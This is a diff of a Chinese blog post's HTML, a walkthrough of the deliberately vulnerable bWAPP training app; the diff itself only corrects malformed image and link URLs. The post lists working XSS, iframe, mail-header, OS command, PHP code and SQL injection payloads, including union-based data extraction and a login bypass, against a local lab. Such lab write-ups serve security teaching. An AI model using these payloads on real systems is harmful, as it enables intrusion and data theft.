@@ -3,10 +3,10 @@
     <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>bWAPP通关教程 | Gridea</title>
-<link rel="shortcut icon" href="https://https://jinqipiaopiao.github.io//favicon.ico?v=1624177818252">
+<link rel="shortcut icon" href="https://jinqipiaopiao.github.io//favicon.ico?v=1624178139382">
 <link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
-<link rel="stylesheet" href="https://https://jinqipiaopiao.github.io//styles/main.css">
-<link rel="alternate" type="application/atom+xml" title="bWAPP通关教程 | Gridea - Atom Feed" href="https://https://jinqipiaopiao.github.io//atom.xml">
+<link rel="stylesheet" href="https://jinqipiaopiao.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="bWAPP通关教程 | Gridea - Atom Feed" href="https://jinqipiaopiao.github.io//atom.xml">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
 
 
@@ -26,8 +26,8 @@ HTML Injection-Reflected(GET)
     <div class="main">
       <div class="main-content">
         <div class="site-header">
-  <a href="https://https://jinqipiaopiao.github.io/">
-  <img class="avatar" src="https://https://jinqipiaopiao.github.io//images/avatar.png?v=1624177818252" alt="">
+  <a href="https://jinqipiaopiao.github.io/">
+  <img class="avatar" src="https://jinqipiaopiao.github.io//images/avatar.png?v=1624178139382" alt="">
   </a>
   <h1 class="site-title">
     Gridea
@@ -95,28 +95,28 @@ HTML Injection-Reflected(GET)
             <div class="post-content-wrapper">
               <div class="post-content">
                 <p>用户名：bee,密码：bug，点击start登陆后即可进行测试<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620309945618.png" alt="" loading="lazy"></p>
+<img src="https://jinqipiaopiao.github.io//post-images/1620309945618.png" alt="" loading="lazy"></p>
 <h1 id="html-injection-reflectedget">HTML Injection-Reflected(GET)</h1>
 <h1 id="1low">1.low</h1>
 <p>这里有两个框让我们输入,先看看源码<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620310110308.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620310110308.png" alt="" loading="lazy"><br>
 这里吧我们输入的firstname和lastname直接带进html了<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620310272174.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620310272174.png" alt="" loading="lazy"><br>
 html是按照我们等级来给函数的，我们看看no_check函数<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620310412618.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620310412618.png" alt="" loading="lazy"><br>
 没有过滤就直接输入了，所以我们直接在First name：和Last name：输入xss代码即可</p>
 <pre><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620310614962.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620310614962.png" alt="" loading="lazy"><br>
 成功<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620310697697.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620310697697.png" alt="" loading="lazy"><br>
 方法二：当然我们还可以这样，在bwapp目录下放置一个图片</p>
 <pre><code>&lt;img src=&quot;bug.txt&quot;&gt;
 </code></pre>
-<figure data-type="image" tabindex="1"><img src="https://https://jinqipiaopiao.github.io//post-images/1620310804656.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://jinqipiaopiao.github.io//post-images/1620310804656.png" alt="" loading="lazy"></figure>
 <h1 id="2medium也就是中等难度">2.medium(也就是中等难度)</h1>
 <p>查看源码发现，这里用了吧尖括号换成实体了，但是用lurldecode函数我们则可以想到直接把我们要输入的值先转成url格式那么他之后就算编码url也不会改变我们输入的内容。<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620310995057.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620310995057.png" alt="" loading="lazy"><br>
 然后在网上找在线转url<br>
 然后输入</p>
 <pre><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;
@@ -124,27 +124,27 @@ html是按照我们等级来给函数的，我们看看no_check函数<br>
 <p>转换后为</p>
 <pre><code>%3cscript%3ealert(%2fxss%2f)%3c%2fscript%3e
 </code></pre>
-<figure data-type="image" tabindex="2"><img src="https://https://jinqipiaopiao.github.io//post-images/1620310697697.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://jinqipiaopiao.github.io//post-images/1620310697697.png" alt="" loading="lazy"></figure>
 <h1 id="3high">3.high</h1>
 <p>看看源码，这里把我们的符号都设置成实体了，所以这是安全的<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620311260056.png" alt="" loading="lazy"></p>
+<img src="https://jinqipiaopiao.github.io//post-images/1620311260056.png" alt="" loading="lazy"></p>
 <h1 id="html-injection-reflected-url">HTML Injection - Reflected (URL)</h1>
 <h1 id="1low-2">1.low</h1>
 <p>我们可以发现通关url可以传输，所以我们在url中构造语句<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620391834747.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620391834747.png" alt="" loading="lazy"><br>
 抓包之后把url中添加上</p>
 <pre><code>?a=&lt;script&gt;alert(/xss/)&lt;/script&gt;
 </code></pre>
-<figure data-type="image" tabindex="3"><img src="https://https://jinqipiaopiao.github.io//post-images/1620391899226.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://jinqipiaopiao.github.io//post-images/1620391899226.png" alt="" loading="lazy"></figure>
 <h1 id="中等高等无法绕过">中等高等无法绕过</h1>
 <h1 id="html-injection-stored-blog">HTML Injection - Stored (Blog)</h1>
 <h1 id="1low-3">1.low</h1>
 <p>直接输入我们的语句即可</p>
 <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620392462080.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620392462080.png" alt="" loading="lazy"><br>
 然后点击提交即可<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620392472774.png" alt="" loading="lazy"></p>
+<img src="https://jinqipiaopiao.github.io//post-images/1620392472774.png" alt="" loading="lazy"></p>
 <h1 id="中等高等无法绕过-2">中等高等无法绕过</h1>
 <h1 id="iframe-injection">iFrame Injection</h1>
 <p>iframe是可用于在HTML页面中嵌入一些文件(如文档，视频等)的一项技术。对iframe最简单的解释就是“iframe是一个可以在当前页面中显示其它页面内容的技术”。<br>
@@ -193,10 +193,10 @@ return $data;
 <p>也可以使用百度链接来访问那么在该页面中就可以显示百度搜索页面内容</p>
 <pre><code>?ParamUrl=http://www.baidu.com&amp;ParamWidth=250&amp;ParamHeight=250
 </code></pre>
-<figure data-type="image" tabindex="4"><img src="https://https://jinqipiaopiao.github.io//post-images/1620395553086.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://jinqipiaopiao.github.io//post-images/1620395553086.png" alt="" loading="lazy"></figure>
 <h1 id="方法二">方法二:</h1>
 <p>也可以闭合iframe标签然后在让他输出script代码<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620395705225.png" alt="" loading="lazy"></p>
+<img src="https://jinqipiaopiao.github.io//post-images/1620395705225.png" alt="" loading="lazy"></p>
 <pre><code>?ParamUrl=&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(1)&lt;/script&gt;&amp;ParamWidth=250&amp;ParamHeight=250
 </code></pre>
 <h1 id="2medium">2.medium</h1>
@@ -214,7 +214,7 @@ return addslashes($data);
 <p>payload:</p>
 <pre><code>?ParamUrl=robots.txt&amp;ParamWidth=250&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(1)&lt;/script&gt;&amp;ParamHeight=250
 </code></pre>
-<figure data-type="image" tabindex="5"><img src="https://https://jinqipiaopiao.github.io//post-images/1620427490652.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://jinqipiaopiao.github.io//post-images/1620427490652.png" alt="" loading="lazy"></figure>
 <h1 id="3high-2">3.high</h1>
 <p>对输出进行了限制并且对预定义字符进行了HTML实体解码所以绕过失败。。。</p>
 <pre><code>function xss_check_3($data, $encoding = &quot;UTF-8&quot;)
@@ -283,7 +283,7 @@ name=Attacker\nbcc: spam@victim.com&amp;replyTo=attacker@attacker.com&amp;messag
 直接在输入框中输入</p>
 <pre><code>www.nsa.gov | whoami
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620465491757.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620465491757.png" alt="" loading="lazy"><br>
 <strong>2.medium</strong><br>
 这里只是把&amp;和；替换掉了，我们一样可以通过<br>
 所以就输入low时的就行</p>
@@ -296,7 +296,7 @@ $input = str_replace(&quot;;&quot;, &quot;&quot;, $input);
 return $input;
 }
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620465491757.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620465491757.png" alt="" loading="lazy"><br>
 <strong>高等无法绕过</strong></p>
 <pre><code>function commandi_check_2($data)
 {
@@ -309,21 +309,21 @@ return escapeshellcmd($data);
 在输入框中输入</p>
 <pre><code>whoami'sleep 5'
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620466770682.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620466770682.png" alt="" loading="lazy"><br>
 或者</p>
 <pre><code>||whoami `sleep 5 `
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620466770682.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620466770682.png" alt="" loading="lazy"><br>
 <strong>2.medium</strong><br>
 和low一样</p>
 <h1 id="php-code-injection">PHP Code Injection</h1>
 <p><strong>1.low</strong></p>
 <pre><code>http://127.0.0.1:8000/phpi.php?message=phpinfo()
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620467071555.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620467071555.png" alt="" loading="lazy"><br>
 <strong>2.medium&amp;3.high</strong><br>
 中等高等用了htmlspecialchars函数故无法绕过<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620467207776.png" alt="" loading="lazy"></p>
+<img src="https://jinqipiaopiao.github.io//post-images/1620467207776.png" alt="" loading="lazy"></p>
 <h1 id="server-side-includes-ssi-injection">Server-Side Includes (SSI) Injection</h1>
 <p>什么是SSI和SSI注入</p>
 <pre><code> SSI是英文Server Side Includes的缩写，翻译成中文就是服务器端包含的意思。从技术角度上说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针。SSI具有强大的功能，只要使用一条简单的SSI 命令就可以实现整个网站的内容更新，时间和日期的动态显示，以及执行shell和CGI脚本程序等复杂的功能。SSI 可以称得上是那些资金短缺、时间紧张、工作量大的网站开发人员的最佳帮手。本文将主要结合Apache服务器介绍SSI的使用方法。 
@@ -388,17 +388,17 @@ return htmlspecialchars($data, ENT_QUOTES, $encoding);
 <pre><code>SELECT * FROM movies WHERE title LIKE '%&quot; . ($title) . &quot;%'
 </code></pre>
 <p>然后搜索'and 1=1#爆出数据<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620470458416.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620470458416.png" alt="" loading="lazy"><br>
 然后判断有几个字段</p>
 <pre><code>' order by 1,2,3,4,5,6,7,8#
 ' order by 1,2,3,4,5,6,7#
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620470591162.png" alt="" loading="lazy"><br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620470594727.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620470591162.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620470594727.png" alt="" loading="lazy"><br>
 然后再想办法得出页面输入的是哪几个字段因为页面只显示了五个字段,所以构建</p>
 <pre><code>' union select 1,2,3,4,5,6,7#
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620470846336.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620470846336.png" alt="" loading="lazy"><br>
 发现显示的是2.3.4.5然后就可以继续让页面显示其他数据了例如数据库用户等等只要对应相对的地方，然后能够显示出来构建爆出版本号，数据库，用户，想要爆出什么数据输入对应的函数即可<br>
 相关函数<br>
 system_user()         系统用户名<br>
@@ -413,10 +413,10 @@ load_file()           MYSQL读取本地文件的函数<br>
 @@version_compile_os  操作系统</p>
 <pre><code>' union select 1,2,version(),database(),user(),6,7#
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620470982721.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620470982721.png" alt="" loading="lazy"><br>
 <strong>2.medium</strong><br>
 这边源码观察到采用addslashes()函数对预定义字符进行了转义  :<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620474471795.png" alt="" loading="lazy"></p>
+<img src="https://jinqipiaopiao.github.io//post-images/1620474471795.png" alt="" loading="lazy"></p>
 <pre><code>    addslashes()函数
 </code></pre>
 <p>返回在预定义字符之前添加反斜杠的字符串<br>
@@ -450,30 +450,30 @@ mysql_real_escape_string()函数<br>
 判断是何注入：</p>
 <pre><code>http://127.0.0.1:8000/sqli_2.php?movie=1 and 1=1#&amp;action=go
 </code></pre>
-<figure data-type="image" tabindex="6"><img src="https://https://jinqipiaopiao.github.io//post-images/1620475788809.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://jinqipiaopiao.github.io//post-images/1620475788809.png" alt="" loading="lazy"></figure>
 <pre><code>http://127.0.0.1:8000/sqli_2.php?movie=1 and 1=2#&amp;action=go
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620475808681.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620475808681.png" alt="" loading="lazy"><br>
 得出为数字型注入<br>
 然后判断字段数</p>
 <pre><code>http://127.0.0.1:8000/sqli_2.php?movie=1 order by 1,2,3,4,5,6,7,8#
 </code></pre>
-<figure data-type="image" tabindex="7"><img src="https://https://jinqipiaopiao.github.io//post-images/1620475988671.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://jinqipiaopiao.github.io//post-images/1620475988671.png" alt="" loading="lazy"></figure>
 <pre><code>http://127.0.0.1:8000/sqli_2.php?movie=1 order by 1,2,3,4,5,6,7#
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620475984589.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620475984589.png" alt="" loading="lazy"><br>
 得出为7个<br>
 然后看页面回显哪几列</p>
 <pre><code>http://127.0.0.1:8000/sqli_2.php?movie=0 union select  1,2,3,4,5,6,7#&amp;action=go
 </code></pre>
-<figure data-type="image" tabindex="8"><img src="https://https://jinqipiaopiao.github.io//post-images/1620476110224.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://jinqipiaopiao.github.io//post-images/1620476110224.png" alt="" loading="lazy"></figure>
 <p>然后让在对应栏位里输出版本号，数据库，用户</p>
 <pre><code>http://127.0.0.1:8000/sqli_2.php?movie=0%20union%20select%20%201,version(),database(),user(),5,6,7#&amp;action=go
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620476166191.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620476166191.png" alt="" loading="lazy"><br>
 <strong>Medium&amp;High</strong><br>
 Medium和High级别分别采用了addslashed()和mysql_real_escape_string()来过滤特殊字符：<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620476275790.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620476275790.png" alt="" loading="lazy"><br>
 但是这是数字型注入，对于字符型注入的防御策略并不起作用<br>
 所以依然可以和low等级一样进行注入<br>
 <strong>SQL Injection (POST/Search)</strong></p>
@@ -482,29 +482,29 @@ Medium和High级别分别采用了addslashed()和mysql_real_escape_string()来�
 攻击者仍然可以通过抓包修改数据包的方式了注入<br>
 <strong>1.low</strong><br>
 判断注入点<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620477553873.png" alt="" loading="lazy"><br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620477557985.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620477553873.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620477557985.png" alt="" loading="lazy"><br>
 得出字符型注入<br>
 接下来就和Get型一样了，只不过再多了一步抓包而已。<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620477727358.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620477727358.png" alt="" loading="lazy"><br>
 <strong>Medium&amp;High</strong><br>
 分别用了addslashes()和mysql_real_escape_string()函数防御：<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620477838661.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620477838661.png" alt="" loading="lazy"><br>
 且在Medium中, mysql编码为utf-8, 无法用宽字节绕过, 安全</p>
 <h1 id="sql-injection-postselect">SQL Injection (POST/Select)</h1>
 <p>方法和上一关一样<br>
 注入类型：<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620478586919.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620478586919.png" alt="" loading="lazy"><br>
 回显正常说明为数字型注入<br>
 判断字段数：<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620478700148.png" alt="" loading="lazy"><br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620478704087.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620478700148.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620478704087.png" alt="" loading="lazy"><br>
 说明为7个字段<br>
 判断显示的是哪几个字段<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620478854544.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620478854544.png" alt="" loading="lazy"><br>
 说明为2，3，4，5<br>
 然后根据显示字段使其显示相关信息如，数据库，用户，版本号<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620478990621.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620478990621.png" alt="" loading="lazy"><br>
 <strong>SQL Injection (AJAX/JSON/jQuery)</strong><br>
 通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行实时更新。<br>
 什么是 AJAX ？<br>
@@ -513,109 +513,109 @@ AJAX 是一种用于创建快速动态网页的技术。<br>
 通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。<br>
 传统的网页（不使用 AJAX）如果需要更新内容，必需重载整个网页面。<br>
 有很多使用 AJAX 的应用程序案例：新浪微博、Google 地图、开心网等等。<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620480149621.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620480149621.png" alt="" loading="lazy"><br>
 对应的js代码如下:<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620480339703.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620480339703.png" alt="" loading="lazy"><br>
 <strong>1.low</strong><br>
 直接用get型url访问是不行的：<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620480426053.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620480426053.png" alt="" loading="lazy"><br>
 在js中采用了getJSON来实时更新查询结果,<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620480515136.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620480515136.png" alt="" loading="lazy"><br>
 然后鼠标右键打开inspect Element点击network当你在页面输入框中输入时你输一个对应在network就会出现一个可以看到<br>
 http://localhost:8080/bWAPP/sqli_10-2.php?<br>
 是以这个打头的所以可以间接的从sqli_10-2.php注入：<br>
 注意这里得用url编码<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620480767947.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620480767947.png" alt="" loading="lazy"><br>
 也可以在sqli_10-1.php搜索框注入：</p>
 <pre><code>Iron%' and 1=1 #
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620480883220.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620480883220.png" alt="" loading="lazy"><br>
 <strong>Medium&amp;High</strong><br>
 分别用了addslashes()和mysql_real_escape_string()函数防御，且在MySQ编码为utf-8,无法用宽字节绕过，安全。</p>
 <h1 id="sql-injection-captcha">SQL Injection (CAPTCHA)</h1>
 <p>（无法使用，不知道是我的问题还是。。）</p>
 <h1 id="sql-injection-login-formhero">SQL Injection (Login Form/Hero)</h1>
 <p><strong>1.low</strong><br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620725573376.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620725573376.png" alt="" loading="lazy"><br>
 我们输入4，仍然可以注入<br>
 我们输入5<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620725577052.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620725577052.png" alt="" loading="lazy"><br>
 说明只有四列<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620725580058.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620725580058.png" alt="" loading="lazy"><br>
 找到回显<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620725584568.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620725584568.png" alt="" loading="lazy"><br>
 这里有报错的话，我们直接报错注入<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620725589145.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620725589145.png" alt="" loading="lazy"><br>
 组合查询数据<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620725592761.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620725592761.png" alt="" loading="lazy"><br>
 <strong>medium&amp;high</strong><br>
 继续构造用户名,  发现服务器只返回了用户名和密码是否正确(合法):<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620725685381.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620725685381.png" alt="" loading="lazy"><br>
 查看源码发现对用户名和密码进行了相应的防护:<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620725714762.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620725714762.png" alt="" loading="lazy"><br>
 分别用了addslashes()和mysql_real_escape_string()函数防御,</p>
 <p>且在mysql编码为utf-8, 无法用宽字节绕过, 安全。</p>
 <h1 id="sql-injection-login-formuser">SQL Injection (Login Form/User)</h1>
 <p><strong>1.low</strong><br>
 继续像上一关那样思路,</p>
 <p>构造万能登录用户名,  密码随意:<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620731757049.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620731757049.png" alt="" loading="lazy"><br>
 发现无法注入。<br>
 查看源码逻辑(黑白盒结合测试),  它先是判断用户名是否存在,  存在之后再判断密码是否正确:<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620731761989.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620731761989.png" alt="" loading="lazy"><br>
 问了一下朋友,  得知这曾经是一道CTF的题,</p>
 <p><strong>分析</strong><br>
 既然sql语句只发生在查询用户名处,  所以注入也只能在用户名,  (因为需要通过用户名验证, 再通过密码)</p>
 <p>注入单引号:<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620731767860.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620731767860.png" alt="" loading="lazy"><br>
 接着判断注入点<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620731772674.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620731772674.png" alt="" loading="lazy"><br>
 发现无法判断,  因为前端回显的结果只有当密码(第二个if语句)也正确时才会显示。<br>
 因此无法使用order by 判断字段数 (判断注入点是为了用order by来得到字段数)<br>
 但是可以直接通过联合查询得到字段数:<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620731776758.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620731776758.png" alt="" loading="lazy"><br>
 判断字段的显示顺序<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620731780883.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620731780883.png" alt="" loading="lazy"><br>
 无法判断,  因为前端回显的结果只有当密码(第二个if语句)也正确时才会显示。</p>
 <p>所以我们进入数据库实验:<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620731784722.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620731784722.png" alt="" loading="lazy"><br>
 可以看到, 联合查询3的位置对应password字段,  且password字段的值是经过md5加密过的,<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620731788977.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620731788977.png" alt="" loading="lazy"><br>
 由于用户名和密码是分开进行判断的,  为了能够回显出报错信息,  需要注入的联合查询字段(顺序为3)与输入的密码相等</p>
 <p>比如,  注入的联合查询为:</p>
 <pre><code>' union select 1,2,3,4,5,6,7,8,9 #
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620731793438.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620731793438.png" alt="" loading="lazy"><br>
 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>e</mi><mi>c</mi><mi>o</mi><mi>r</mi><mi>d</mi><mi>s</mi><mi>e</mi><mi>t</mi><mi mathvariant="normal">从</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">据</mi><mi mathvariant="normal">库</mi><mi mathvariant="normal">中</mi><mi mathvariant="normal">搜</mi><mi mathvariant="normal">索</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">有</mi><mi mathvariant="normal">了</mi><mi mathvariant="normal">返</mi><mi mathvariant="normal">回</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">即</mi></mrow><annotation encoding="application/x-tex">recordset从数据库中搜索就有了返回值，即</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">d</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord cjk_fallback">从</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">据</span><span class="mord cjk_fallback">库</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">搜</span><span class="mord cjk_fallback">索</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">返</span><span class="mord cjk_fallback">回</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">即</span></span></span></span>row[&quot;login&quot;]返回不为空，这里第一个条件就构成了。后面POST的“&amp;password=3”，3的hash的值被我们添加到联合查询语句里了，即返回的查询有3的hash值</p>
 <p>所以输入密码与联合查询输入的3字段相等即可<br>
 用户名:  ' union select 1,2,&quot;77de68daecd823babbb58edb1c8e14d7106e83bb&quot;,4,5,6,7,8,9 #<br>
 密码  :  3<br>
 其中,   sha1(3) 加密后为 77de68daecd823babbb58edb1c8e14d7106e83bb<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1620731798272.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1620731798272.png" alt="" loading="lazy"><br>
 得知注入字段显示顺序为2和5</p>
 <p>当前数据库和用户</p>
 <pre><code>用户名:  ' union select 1,database(),&quot;77de68daecd823babbb58edb1c8e14d7106e83bb&quot;,4,user(),6,7,8,9 #
 密码  :  3
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1620731803242.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1620731803242.png" alt="" loading="lazy"><br>
 爆表</p>
